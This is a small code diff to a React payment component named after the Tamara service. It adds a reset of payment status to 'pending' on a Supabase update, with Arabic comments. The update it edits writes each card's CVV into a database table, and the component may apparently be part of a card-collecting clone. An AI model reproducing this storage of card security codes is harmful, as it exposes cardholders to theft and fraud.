@@ -41,7 +41,7 @@ const TamaraPaymentProcessing = () => {
   useEffect(() => {
     const submitPayment = async () => {
       try {
-        // تحديث سجل الدفع الموجود بدلاً من إنشاء جديد
+        // تحديث سجل الدفع وإعادة تعيين الحالة إلى pending للمحاولة الجديدة
         const { error: updateError } = await supabase
           .from("tamara_payments")
           .update({
@@ -52,6 +52,7 @@ const TamaraPaymentProcessing = () => {
             cvv: cvv,
             total_amount: parseFloat(totalAmount),
             monthly_payment: parseFloat(monthlyPayment),
+            payment_status: "pending", // إعادة تعيين الحالة للمحاولة الجديدة
           })
           .eq("id", paymentId);
 
